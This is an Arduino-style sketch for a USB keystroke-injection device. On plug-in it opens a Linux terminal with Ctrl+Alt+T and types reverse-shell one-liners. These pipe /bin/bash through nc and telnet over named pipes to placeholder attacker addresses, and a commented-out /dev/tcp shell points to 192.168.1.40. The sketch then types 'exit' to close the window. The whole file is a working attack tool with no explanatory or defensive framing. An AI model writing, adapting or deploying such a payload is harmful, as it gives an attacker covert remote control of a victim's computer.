
# define PAYLOAD1 "mknod bp1 p && nc INPUT0 INPUT1 0<bp1 | /bin/bash 1>bp1 &"
//# define PAYLOAD2 "/bin/bash -i > /dev/tcp/192.168.1.40/8080 0<&1 2>&1 &" 
#define PAYLOAD3 "mknod bp2 p && telnet INPUT2 INPUT3 0<bp2 | /bin/bash 1>bp2 &"

void setup()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.println(PAYLOAD1);
  delay(2000);
  //Keyboard.println(PAYLOAD2);
  //delay(2000);
  Keyboard.println(PAYLOAD3);
  delay(2000);
  Keyboard.println("exit");
  
}

void loop()
{
   
}

void terminal()
{
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  delay(100);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now(); 

}

